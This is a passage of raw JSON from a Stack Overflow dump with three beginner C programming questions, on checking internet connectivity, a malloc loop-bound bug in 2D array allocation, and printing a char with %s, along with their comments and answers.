336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1497987265, "post_id": 44660010, "comment_id": 76308696, "body": "Well, there is a big problem - the internet does not exist as one entity, so you cannot 100% reliably detect any &#39;connection &#39; to it.  You can guess with some certainty - if you ping Google and it fails,.you have no internet connection..or Google is unreachable for some reason at that time....."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1497987403, "post_id": 44660010, "comment_id": 76308788, "body": "&#39;Before this I have to check whether the Internet connection is available or not&#39; - why?"}, {"owner": {"reputation": 37, "user_id": 7974233, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjcHwsfv7xM/AAAAAAAAAAI/AAAAAAAAACY/nBIYRI_ByI8/photo.jpg?sz=128", "display_name": "Piyumi Guruge", "link": "https://stackoverflow.com/users/7974233/piyumi-guruge"}, "reply_to_user": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1498077765, "post_id": 44660010, "comment_id": 76355885, "body": "@ThingyWotsit : Thank you. Now I understand what&#39;s the path I have to follow. I&#39;m trying with pinging google"}], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 7974233, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjcHwsfv7xM/AAAAAAAAAAI/AAAAAAAAACY/nBIYRI_ByI8/photo.jpg?sz=128", "display_name": "Piyumi Guruge", "link": "https://stackoverflow.com/users/7974233/piyumi-guruge"}, "edited": false, "score": 0, "creation_date": 1497982320, "post_id": 44660186, "comment_id": 76305759, "body": "Thank you. Can you suggest me a method to check the Internet availability? I&#39;m asking about a simple c function or something like that.."}, {"owner": {"reputation": 17546, "user_id": 13022, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/fe131c1359157fb83187527255bb60cc?s=128&d=identicon&r=PG", "display_name": "St&#233;phane", "link": "https://stackoverflow.com/users/13022/st%c3%a9phane"}, "reply_to_user": {"reputation": 37, "user_id": 7974233, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjcHwsfv7xM/AAAAAAAAAAI/AAAAAAAAACY/nBIYRI_ByI8/photo.jpg?sz=128", "display_name": "Piyumi Guruge", "link": "https://stackoverflow.com/users/7974233/piyumi-guruge"}, "edited": false, "score": 3, "creation_date": 1497982546, "post_id": 44660186, "comment_id": 76305899, "body": "&quot;Simple&quot;?  No.  Depends on what is needed, and the network.  Do you need to check connectivity to a server?  Check if the name server is up?  Check if the firewall is letting TCP or UDP packets through?  Check if a port is open?  There is no &quot;simple&quot; solution to this question."}, {"owner": {"reputation": 37, "user_id": 7974233, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjcHwsfv7xM/AAAAAAAAAAI/AAAAAAAAACY/nBIYRI_ByI8/photo.jpg?sz=128", "display_name": "Piyumi Guruge", "link": "https://stackoverflow.com/users/7974233/piyumi-guruge"}, "edited": false, "score": 0, "creation_date": 1497983136, "post_id": 44660186, "comment_id": 76306267, "body": "Ok. I&#39;m just running the &#39;traceroute&#39; command using a C program. So, I have to check the Internet connection before run the system command. That&#39;s my problem. Please can you suggest a method to do this."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1497987331, "post_id": 44660186, "comment_id": 76308734, "body": "&#39;So, I have to check the Internet connection before run the system command&#39; - why?  Run it anyway.  If it fails, deal with it."}], "tags": [], "owner": {"reputation": 17546, "user_id": 13022, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/fe131c1359157fb83187527255bb60cc?s=128&d=identicon&r=PG", "display_name": "St&#233;phane", "link": "https://stackoverflow.com/users/13022/st%c3%a9phane"}, "is_accepted": true, "score": 0, "last_activity_date": 1497982128, "creation_date": 1497982128, "answer_id": 44660186, "question_id": 44660010, "link": "https://stackoverflow.com/questions/44660010/is-there-any-library-functions-in-c-to-check-the-internet-connection/44660186#44660186", "title": "Is there any library functions in C to check the Internet connection?", "body": "<p>Short answer:  no.  Neither C nor C++ has direct knowledge of networking, or any built-in networking functions.</p>\n\n<p>Depending on what 3rd-party libraries you are using, there may be something you can use, but that depends on the library, it isn't directly part of C.</p>\n\n<p>I can imagine there are libraries out there that might try to ping some internal/external address, perform a name lookup, etc.  But if you're on an isolated network, not having the ability to ping, lookup, or cross a firewall to get to a certain location may be perfectly valid, and doesn't indicate a networking problem.</p>\n"}], "owner": {"reputation": 37, "user_id": 7974233, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjcHwsfv7xM/AAAAAAAAAAI/AAAAAAAAACY/nBIYRI_ByI8/photo.jpg?sz=128", "display_name": "Piyumi Guruge", "link": "https://stackoverflow.com/users/7974233/piyumi-guruge"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 744, "favorite_count": 1, "closed_date": 1497983263, "accepted_answer_id": 44660186, "answer_count": 1, "score": -3, "last_activity_date": 1497983599, "creation_date": 1497981438, "last_edit_date": 1497983599, "question_id": 44660010, "link": "https://stackoverflow.com/questions/44660010/is-there-any-library-functions-in-c-to-check-the-internet-connection", "closed_reason": "Not suitable for this site", "title": "Is there any library functions in C to check the Internet connection?", "body": "<p>Can you give me a simplest method to check the Internet availability using a C program in Linux?</p>\n\n<p>I have implemented a program to run the system command 'traceroute' in C. Before this I have to check whether the Internet connection is available or not. So can you suggest a method?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 5, "creation_date": 1497979875, "post_id": 44659534, "comment_id": 76304262, "body": "Perhaps better naming of your variables and symbolic constants are in order?"}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 1, "creation_date": 1497979899, "post_id": 44659534, "comment_id": 76304279, "body": "Why are you indexing to the wrong variable limit?  Auto-UB"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1497979959, "post_id": 44659534, "comment_id": 76304306, "body": "And please read <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">this question and its answers about casting <code>malloc</code> in C</a>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1497980009, "post_id": 44659534, "comment_id": 76304333, "body": "Rather than <code>N,M,i</code>, use something like <code>HEIGHT, WIDTH, h</code>."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1497980068, "post_id": 44659534, "comment_id": 76304366, "body": "Also note that you don&#39;t have any 2D arrays."}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 1, "creation_date": 1497980097, "post_id": 44659534, "comment_id": 76304383, "body": "@Afshin Ahmadi  Ignore the reference &quot;this question and its answers about casting malloc in C&quot;. There are advices of low-quakified programmers."}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1497980107, "post_id": 44659534, "comment_id": 76304386, "body": "@xing I am a bit confused! Shouldn&#39;t I use N since I am trying to define a MxN matrix?"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 2, "creation_date": 1497980159, "post_id": 44659534, "comment_id": 76304417, "body": "@AfshinAhmadi You declared at first M pointers. So the loop should use the value of M."}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1497980269, "post_id": 44659534, "comment_id": 76304493, "body": "@Someprogrammerdude actually I have a better naming of variables in my program. Just simplified it here."}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 1, "creation_date": 1497980273, "post_id": 44659534, "comment_id": 76304498, "body": "@AfshinAhmadi Use castings of malloc. It makes your code more clear and readable and allows to avoid many non-obvious errors. And moreover you will be able to use such a code in C and C++ programs."}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "reply_to_user": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 0, "creation_date": 1497980766, "post_id": 44659534, "comment_id": 76304799, "body": "@VladfromMoscow can you give me an example?"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 0, "creation_date": 1497981083, "post_id": 44659534, "comment_id": 76305001, "body": "@AfshinAhmadi Example of what?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497981199, "post_id": 44659534, "comment_id": 76305064, "body": "@AfshinAhmadi To cast or not to cast, that is the <a href=\"https://en.wikipedia.org/wiki/To_be,_or_not_to_be\" rel=\"nofollow noreferrer\">question</a> best for another post like <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">this</a>.  The best answer, IMO, is to follow your group&#39;s coding standards."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497982714, "post_id": 44659534, "comment_id": 76305996, "body": "&quot;Program stops when defining dynamic 2D array&quot; - There is no 2D array in your code and noting which can be used as one or point to one! A pointer is not an array. (And that has nothing to do with dynamic allocation)"}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1498008022, "post_id": 44659534, "comment_id": 76316060, "body": "@xing The code crashes when the array size is like 20,000 x 20,000. But it works fine when array size is like 118x118!!!"}, {"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 1, "creation_date": 1498008178, "post_id": 44659534, "comment_id": 76316099, "body": "If you have a new problem, ask a new question, and this time put together a complete example that demonstrates it, something others could compile. You should also consider how much memory a 20kx20k array uses, perhaps you&#39;re running out. Add some error checking and narrow down the problem."}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1498057936, "post_id": 44659534, "comment_id": 76344244, "body": "@xing I checked the malloc and it failed. The funny thing is that the first array (Cf) allocates perfectly, but when it comes to the second array (Ct) malloc fails. They both have the same size (20kx20k). I also tried calloc and encountered same issue. These variables are defined in a function. What do you think could cause this problem? I have more than enough memory on my computer!"}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1498059342, "post_id": 44659534, "comment_id": 76345288, "body": "@xing I checked the memory usage and I still have 9GB of free RAM. It is just weird. I also tried to allocate these two arrays in an empty project and it just worked fine!"}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1498060468, "post_id": 44659534, "comment_id": 76346119, "body": "@xing Do you know a more efficient way of allocating dynamic 2d arrays? I may encounter 100kx100k matrices in the future."}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1498061985, "post_id": 44659534, "comment_id": 76347052, "body": "@xing Thank you, Xing. I will ask this question in a separate post. Stackoverflow has blocked me for 1 day because of negative points in this post!"}], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "edited": false, "score": 0, "creation_date": 1497981028, "post_id": 44659704, "comment_id": 76304971, "body": "If i use calloc, I won&#39;t be able to access array elements in the form of array[i][j], right?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "edited": false, "score": 0, "creation_date": 1497981345, "post_id": 44659704, "comment_id": 76305161, "body": "@AfshinAhmadi <a href=\"https://stackoverflow.com/questions/44659534/program-stops-when-defining-dynamic-2d-array-in-c/44659704#comment76304971_44659704\">That</a> is incorrect.  Code can access via <code>Cf[m][n]</code> if  <code>malloc()</code>, <code>calloc()</code> (or <code>realloc()</code> with prior allocaitons) was used like above."}, {"owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "edited": false, "score": 0, "creation_date": 1498007975, "post_id": 44659704, "comment_id": 76316051, "body": "The code crashes when the array size is like 20,000 x 20,000. But it works fine when array size is like 118x118!!!"}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1497980758, "last_edit_date": 1497980758, "creation_date": 1497980337, "answer_id": 44659704, "question_id": 44659534, "link": "https://stackoverflow.com/questions/44659534/program-stops-when-defining-large-dynamic-2d-array-in-c/44659704#44659704", "title": "Program stops when defining large dynamic 2D array in C", "body": "<p>Key issue: Wrong range used.  Should be <code>&lt;M</code>, not <code>&lt;N</code>. <a href=\"https://stackoverflow.com/questions/44659534/program-stops-when-defining-dynamic-2d-array-in-c/44659704#comment76304230_44659534\">@xing</a></p>\n\n<p>Recommend using <code>sizeof</code> against the referenced object than the type.  Easier to code, review and maintain.</p>\n\n<p>Note that the casts are not required.  <a href=\"https://stackoverflow.com/questions/44659534/program-stops-when-defining-dynamic-2d-array-in-c/44659704#comment76304306_44659534\">@Some programmer dude</a></p>\n\n<pre><code>int **Cf = malloc(sizeof *CF * M);\nassert(Cf);\n\n//           M, not N\n// for(i=0;i&lt;N;i++){\nfor(size_t m=0; m &lt; M; m++){ \n\n    printf(\"%zu\\n\", m);\n    Cf[m] = malloc(sizeof *(Cf[m]) * N);\n    assert(Cf[m]);\n} \n</code></pre>\n\n<p>Code also used <code>m</code> instead of <code>i</code> to help make clear that the <code>m</code> index goes with <code>M</code>.  </p>\n\n<hr>\n\n<p>To use <code>calloc()</code></p>\n\n<pre><code>// int **Cf = malloc(sizeof *CF * M);\nint **Cf = calloc(M, sizeof *CF);\n\n    // Cf[m] = malloc(sizeof *(Cf[m]) * N);\n    Cf[m] = calloc(N, sizeof *(Cf[m]));\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 8168824, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-EM5AdWJcglw/AAAAAAAAAAI/AAAAAAAAAjQ/5ITrauKeJxk/photo.jpg?sz=128", "display_name": "Afshin Ahmadi", "link": "https://stackoverflow.com/users/8168824/afshin-ahmadi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 110, "favorite_count": 0, "closed_date": 1498008042, "answer_count": 1, "score": -3, "last_activity_date": 1498078659, "creation_date": 1497979748, "last_edit_date": 1498078659, "question_id": 44659534, "link": "https://stackoverflow.com/questions/44659534/program-stops-when-defining-large-dynamic-2d-array-in-c", "closed_reason": "Not suitable for this site", "title": "Program stops when defining large dynamic 2D array in C", "body": "<p>I am trying to define two dynamic 2-dimensional arrays using malloc and here is the code (I know that M = 118 and N = 186):</p>\n\n<pre><code>int **Cf;\nCf = (int **) malloc(M * sizeof(int *));\nfor (i = 0; i &lt; N; i++)         \n    Cf[i] = (int *) malloc(N * sizeof(int));\n</code></pre>\n\n<p>The array Cf allocates memory with no problem. However, my program crashes when it comes to Ct. I debugged the code and found out that <code>Ct[i] = (int *) malloc(N * sizeof(int))</code> fails when <code>N=164</code> which is kinda weird.</p>\n"}, {"tags": ["c", "pointers", "malloc"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1497978620, "post_id": 44659206, "comment_id": 76303598, "body": "Because <code>%s</code> is making <code>printf</code> to expect a pointer. &quot;Empty&quot; string is one of the outcomes of the undefined behavior you are invoking by passing it <code>char</code> instead."}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1497981825, "post_id": 44659206, "comment_id": 76305455, "body": "<code>*orderup</code> is a single <code>char</code> and is the first position of the memory you allocated with malloc.  You should have gotten a compiler warning for the line <code>printf(&quot;\\n%s&quot;,*orderdup);</code> since the <code>%s</code> format specifier expects a char pointer (i.e. string), and you supplied a single char."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1497982895, "post_id": 44659206, "comment_id": 76306118, "body": "What about the man-page of <code>printf</code> is unclear? Did you even read it? What does your C book say? If you are learning C from youtube videos or online tutorials: ask their authors! They apparently taught rubbish."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497983208, "post_id": 44659206, "comment_id": 76306313, "body": "Curious, what or who suggested &quot;it should print the address&quot; ?"}, {"owner": {"reputation": 71, "user_id": 5523644, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e43151e2cf0d6fa1b1872540156cfa45?s=128&d=identicon&r=PG&f=1", "display_name": "Pramanshu", "link": "https://stackoverflow.com/users/5523644/pramanshu"}, "edited": false, "score": 0, "creation_date": 1498019963, "post_id": 44659206, "comment_id": 76318893, "body": "I was just curious as I am thinking orderup contains address of char so it should print address.but now I am clear that it depends on format specifier(%s or %p).the pointer appears very confusing to me."}], "answers": [{"comments": [{"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 2, "creation_date": 1497979187, "post_id": 44659245, "comment_id": 76303891, "body": "And to print the first character (if that&#39;s what&#39;s intended), use <code>%c</code>."}], "tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": false, "score": 1, "last_activity_date": 1497978644, "creation_date": 1497978644, "answer_id": 44659245, "question_id": 44659206, "link": "https://stackoverflow.com/questions/44659206/about-the-malloc-in-c-pointers/44659245#44659245", "title": "about the malloc in c pointers", "body": "<p><code>*orderdup</code> is of <code>char</code> type. You are using <code>%s</code> specifier to print a <code>char</code> data type while <code>%s</code> expects a <code>char *</code> data type. It will invoke undefined behavior. To print address use <code>%p</code>  </p>\n\n<pre><code>printf(\"%p\", (void*)orderdup);\n</code></pre>\n"}], "owner": {"reputation": 71, "user_id": 5523644, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e43151e2cf0d6fa1b1872540156cfa45?s=128&d=identicon&r=PG&f=1", "display_name": "Pramanshu", "link": "https://stackoverflow.com/users/5523644/pramanshu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1497978669, "creation_date": 1497978527, "last_edit_date": 1497978573, "question_id": 44659206, "link": "https://stackoverflow.com/questions/44659206/about-the-malloc-in-c-pointers", "title": "about the malloc in c pointers", "body": "<p>I am stuck with basics of pointers Here are my code </p>\n\n<pre><code>char *orderUp;\n\norderdup = malloc(10 * sizeof(char));\n\nprintf(\"enter string\");\nscanf(\"\\n%s\",orderdup);\nprintf(\"\\n%s\",orderdup);// gives scanned strings\nprintf(\"\\n%s\",*orderdup);// gives empty string\n</code></pre>\n\n<p>Here This program is running fine . I want to know that why in  printf statement giving the scanned string.I mean it should print the address but why it is printing string and last printf statement gives empty string.</p>\n"}]